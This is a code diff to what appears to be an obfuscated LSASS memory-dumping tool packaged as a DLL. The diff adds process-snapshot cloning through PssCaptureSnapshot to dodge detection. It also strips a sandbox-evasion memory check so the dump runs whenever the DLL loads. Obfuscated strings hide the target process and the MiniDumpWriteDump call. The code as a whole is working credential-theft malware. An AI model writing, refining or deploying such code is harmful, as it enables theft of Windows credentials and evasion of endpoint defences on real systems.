@@ -3,6 +3,8 @@
 #include <stdio.h>
 #include <TlHelp32.h>
 #include <DbgHelp.h>
+#include <processsnapshot.h>
+#pragma comment (lib, "Dbghelp.lib")
 
 // Global variables the will hold the dump data and its size
 LPVOID dumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 200); // Allocate 200MB buffer on the heap
@@ -176,8 +178,14 @@ int main(int argc, char** argv)
 	strcat(mi$$ni$du$p, tD);
 	strcat(mi$$ni$du$p, mp);
 
+	HANDLE snapshotHandle = NULL;
+	DWORD flags = (DWORD)PSS_CAPTURE_VA_CLONE | PSS_CAPTURE_HANDLES | PSS_CAPTURE_HANDLE_NAME_INFORMATION | PSS_CAPTURE_HANDLE_BASIC_INFORMATION | PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION | PSS_CAPTURE_HANDLE_TRACE | PSS_CAPTURE_THREADS | PSS_CAPTURE_THREAD_CONTEXT | PSS_CAPTURE_THREAD_CONTEXT_EXTENDED | PSS_CREATE_BREAKAWAY | PSS_CREATE_BREAKAWAY_OPTIONAL | PSS_CREATE_USE_VM_ALLOCATIONS | PSS_CREATE_RELEASE_SECTION;
+	ZeroMemory(&CallbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
+
+	PssCaptureSnapshot(hProc, (PSS_CAPTURE_FLAGS)flags, CONTEXT_ALL, (HPSS*)&snapshotHandle);
+
 	MyMiniDumpWriteDump myMiniDumpWriteDump = (MyMiniDumpWriteDump)GetProcAddress(LoadLibrary(dbg$$h$lp), mi$$ni$du$p);
-	BOOL success = myMiniDumpWriteDump(hProc, pid, NULL, MiniDumpWithFullMemory, NULL, NULL, &CallbackInfo);
+	BOOL success = myMiniDumpWriteDump(snapshotHandle, pid, NULL, MiniDumpWithFullMemory, NULL, NULL, &CallbackInfo);
 	if (success) {
 		printf("[+] Successfully dumped ls__a_ss to memory!\n");
 	}
@@ -202,14 +210,15 @@ int main(int argc, char** argv)
 
 extern "C" __declspec(dllexport)
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
-	char* mem = NULL;
-	mem = (char*)malloc(6442450944);
+	//char* mem = NULL;
+	//mem = (char*)malloc(6442450944);
 
-	if (mem != NULL) {
-		memset(mem, 00, 6442450944);
-		free(mem);
-		main(0, {});
-	}
-
+	//if (mem != NULL) {
+		//memset(mem, 00, 6442450944);
+		//free(mem);
+		//main(0, {});
+	//}
+	
+	main(0, {});
 	return TRUE;
 }
